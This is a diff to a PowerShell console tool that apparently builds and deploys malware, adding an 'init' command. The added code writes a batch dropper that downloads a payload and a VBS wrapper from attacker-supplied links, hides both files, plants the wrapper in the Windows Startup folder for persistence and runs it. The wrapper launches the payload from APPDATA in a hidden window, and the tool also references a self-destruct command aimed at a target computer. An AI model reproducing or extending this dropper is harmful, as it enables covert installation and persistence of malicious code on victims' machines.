@@ -27,6 +27,7 @@ function Show-Help {
     Write-Host ""
     Write-Host "  deploy           - Create the payload" -ForegroundColor White
     Write-Host "  wrap             - Create a vbs file that hides the payload" -ForegroundColor White
+    Write-Host "  init             - Create the init script" -ForegroundColor White
     Write-Host "  clear            - Clear the screen" -ForegroundColor White
     Write-Host "  help             - Show this help message" -ForegroundColor White
     Write-Host "  exit             - Exit the application" -ForegroundColor White
@@ -623,21 +624,43 @@ while (`$true) {
 function Wrap-Script {
     param([string]$FilePath = $ProfileFile)
 
-    $payloadPath = Read-Host "Payload path"
+    $payloadPath = Read-Host "Payload path: APPDATA\"
     $payloadPath = $payloadPath.Trim('"')
     $escapedPath = $payloadPath -replace '"', '""'
 
     Write-Host ""
 
     $fileContent = @'
-Dim path
-path = "{0}"
-CreateObject("WScript.Shell").Run """" & path & """", 0, False
+Dim shell, path
+Set shell = CreateObject("WScript.Shell")
+path = shell.ExpandEnvironmentStrings("%APPDATA%") & "\{0}"
+shell.Run """" & path & """", 0, False
 '@ -f $escapedPath
 
     Set-Content -Path "wrapper.vbs" -Value $fileContent -Encoding ASCII
     Write-Host "Wrap script created as 'wrapper.vbs'" -ForegroundColor DarkGreen
     Write-Host ""
+}
+
+function Init-Script {
+    $payloadLink = Read-Host "Payload link"
+    $wrapperLink = Read-Host "Wrapper link"
+
+    $payloadPath = Read-Host "Payload path"
+    $wrapperName = Read-Host "Wrapper name"
+
+    $psCommand = '$startup=[Environment]::GetFolderPath(''Startup''); ' +
+        "iwr '$payloadLink' -OutFile (Join-Path $env:APPDATA '$payloadPath'); " +
+        "attrib +h (Join-Path $env:APPDATA '$payloadPath'); " +
+        "iwr '$wrapperLink' -OutFile (Join-Path `$startup '$wrapperName'); " +
+        "attrib +h (Join-Path `$startup '$wrapperName'); " +
+        "& (Join-Path `$startup '$wrapperName'); exit"
+
+    $batchContent = "powershell -NoProfile -Command `"$psCommand`""
+
+    Set-Content -Path "init.bat" -Value $batchContent -Encoding ASCII
+
+    Write-Host "Init script created as 'init.bat'" -ForegroundColor DarkGreen
 }
 
 function Clear-Screen {
@@ -909,11 +932,14 @@ while (-not $exitRequested) {
             }
             Send-SelfDestruct -TargetComputer $targetComputer
         }
-        "^(deploy|d)$" {
+        "^(deploy|d|payload)$" {
             Deploy-Script
         }
         "^wrap$" {
             Wrap-Script
+        }
+        "^(init|i)$" {
+            Init-Script
         }
         "^(cls|clear)$" {
             Clear-Screen
